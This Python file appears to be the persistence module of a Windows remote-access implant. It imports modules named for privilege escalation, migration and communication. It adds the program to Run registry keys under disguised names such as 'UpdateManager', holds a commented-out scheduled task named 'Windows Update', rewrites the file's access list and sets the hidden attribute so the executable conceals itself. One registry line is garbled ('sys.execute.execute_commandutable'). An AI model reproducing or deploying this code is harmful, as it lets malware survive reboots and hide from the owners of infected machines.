from defines import *
import helpers, privilege_escalation, migration, persistence, communication, intel, interact, execute, mutex
# Functions that help achieve persistence.

def persist():
	"""
	communication.status("[*]Adding executable to scheduled tasks.")
	if helpers.is_admin():
		execute.start_detached('schtasks /CREATE /TN "Windows Update" /TR "'+EXECUTABLE_PATH+'" /SC minute')
	else:
		execute.start_detached('schtasks /CREATE /TN "Windows Update" /TR "'+EXECUTABLE_PATH+'" /SC minute /IT /RU %USERNAME%')
	"""
	if helpers.is_admin():
		communication.status("[*]Adding executable to HKLM.")
		retval = subprocess.Popen("reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v j4h5b6j4h5 /t REG_SZ /d "+sys.execute.execute_commandutable+" /f", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		output = retval.communicate()
		print(output)
		print(retval.returncode)
		if retval.returncode == 0:
			return("[+]Succesfully added file to registry for local machine.")
	else:
		communication.status("[*]Adding executable to HKCU.")
		retval = subprocess.Popen("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v UpdateManager /t REG_SZ /d "+EXECUTABLE_PATH+" /f", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		retval.communicate()
		if retval.returncode == 0:
			return("[+]Succesfully added file to current user's registry.")
	
	
def set_ACL():
	system, domain, type = win32security.LookupAccountName ("", "SYSTEM")
	erryone, domain, type = win32security.LookupAccountName ("", name_of_everyone_group())
	file = EXECUTABLE_PATH
	sd = win32security.GetFileSecurity(file, win32security.DACL_SECURITY_INFORMATION)
	dacl = win32security.ACL()
	dacl.AddAccessAllowedAce(win32security.ACL_REVISION, ntsecuritycon.FILE_ALL_ACCESS, system)
	dacl.AddAccessAllowedAce(win32security.ACL_REVISION, ntsecuritycon.FILE_GENERIC_READ | ntsecuritycon.FILE_GENERIC_EXECUTE, erryone)
	sd.SetSecurityDescriptorDacl(1, dacl, 0)
	win32security.SetFileSecurity(file, win32security.DACL_SECURITY_INFORMATION, sd)
	
def hide_file(file):
	ret = ctypes.windll.kernel32.SetFileAttributesA(file, 0x02)
	if ret == 0: return True
	else: return False
	
def hide_self():
	origdir = os.getcwd()
	os.chdir(os.path.abspath(os.path.dirname(sys.executable)))
	ok = hide_file(EXECUTABLE_PATH)
	set_ACL()
	os.chdir(origdir)
	return ok
	